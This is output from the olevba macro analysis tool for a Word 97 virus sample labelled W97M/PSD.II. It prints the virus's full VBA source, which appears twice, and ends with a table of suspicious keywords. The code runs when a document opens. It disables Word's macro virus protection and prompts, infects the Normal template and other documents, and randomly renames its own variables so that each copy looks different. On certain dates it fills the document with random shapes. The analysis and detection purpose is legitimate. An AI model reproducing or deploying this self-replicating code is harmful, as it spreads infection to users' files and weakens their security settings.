olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psd.b-4a25f78937955ba542464c524d1f29db740e32c9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psd.b-4a25f78937955ba542464c524d1f29db740e32c9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For QF5650 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next QF5650: End If
BG8112 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
IA832 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set DG1899 = ActiveDocument.VBProject.VBComponents.Item(1)
VR1131 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set DG1899 = NormalTemplate.VBProject.VBComponents.Item(1)
OG7486 = True
Call IJ236_VQ660
ActiveDocument.Saved = True
End If
If OG7486 <> True And VR1131 <> True Then GoTo NT700
If OG7486 = True Then DG1899.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, BG8112 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If VR1131 = True Then DG1899.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, IA832 - 4))
NT700:
If IA832 <> 0 And BG8112 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function IJ236_VQ660()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "OO3456": r1(2) = "QN856": r1(3) = "JH7634": r1(4) = "SN8293": r1(5) = "VQ660": r1(6) = "BG8112"
r1(7) = "IA832": r1(8) = "VR1131":: r1(9) = "DG1899": r1(10) = "OG7486": r1(11) = "NT700": r1(12) = "IJ236": r1(13) = "NA5323": r1(14) = "VB28": r1(15) = "QF5650"
For QF5650 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call VQ660(a1, r1(QF5650))
Next QF5650
End Function 'VAMP v1.0 [thanks Vic!]
Private Function VQ660(VB28, NA5323 As String)
On Error Resume Next
Dim OO3456 As Long: Dim QN856 As Long: Dim JH7634 As Long: Dim SN8293 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
OO3456 = 1: QN856 = 1: JH7634 = .CountOfLines: SN8293 = Len(.Lines(.CountOfLines, 1))
Do While .Find(NA5323, OO3456, QN856, JH7634, SN8293, True)
strline = .Lines(OO3456, 1)
strline = Left(strline, QN856 - 1) & VB28 & Mid(strline, SN8293)
.replaceline OO3456, strline
OO3456 = JH7634 + 1: QN856 = 1:
JH7634 = .CountOfLines
SN8293 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function

Private Sub Document_C()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For LP6860 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next LP6860: End If
KQ8133 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
CM9031 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set HV823 = ActiveDocument.VBProject.VBComponents.Item(1)
OT7120 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set HV823 = NormalTemplate.VBProject.VBComponents.Item(1)
BN320 = True
Call KD5741_KM6385
ActiveDocument.Saved = True
End If
If BN320 <> True And OT7120 <> True Then GoTo VN151
If BN320 = True Then HV823.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, KQ8133 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If OT7120 = True Then HV823.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, CM9031 - 4))
VN151:
If CM9031 <> 0 And KQ8133 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function KD5741_KM6385()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "FD8988": r1(2) = "UP8720": r1(3) = "IG4087": r1(4) = "TL7973": r1(5) = "KM6385": r1(6) = "KQ8133"
r1(7) = "CM9031": r1(8) = "OT7120":: r1(9) = "HV823": r1(10) = "BN320": r1(11) = "VN151": r1(12) = "KD5741": r1(13) = "HD853": r1(14) = "FS9162": r1(15) = "LP6860"
For LP6860 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call KM6385(a1, r1(LP6860))
Next LP6860
End Function 'VAMP v1.0 [thanks Vic!]
Private Function KM6385(FS9162, HD853 As String)
On Error Resume Next
Dim FD8988 As Long: Dim UP8720 As Long: Dim IG4087 As Long: Dim TL7973 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
FD8988 = 1: UP8720 = 1: IG4087 = .CountOfLines: TL7973 = Len(.Lines(.CountOfLines, 1))
Do While .Find(HD853, FD8988, UP8720, IG4087, TL7973, True)
strline = .Lines(FD8988, 1)
strline = Left(strline, UP8720 - 1) & FS9162 & Mid(strline, TL7973)
.replaceline FD8988, strline
FD8988 = IG4087 + 1: UP8720 = 1:
IG4087 = .CountOfLines
TL7973 = Len(.Lines(.CountOfLines, 1))
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

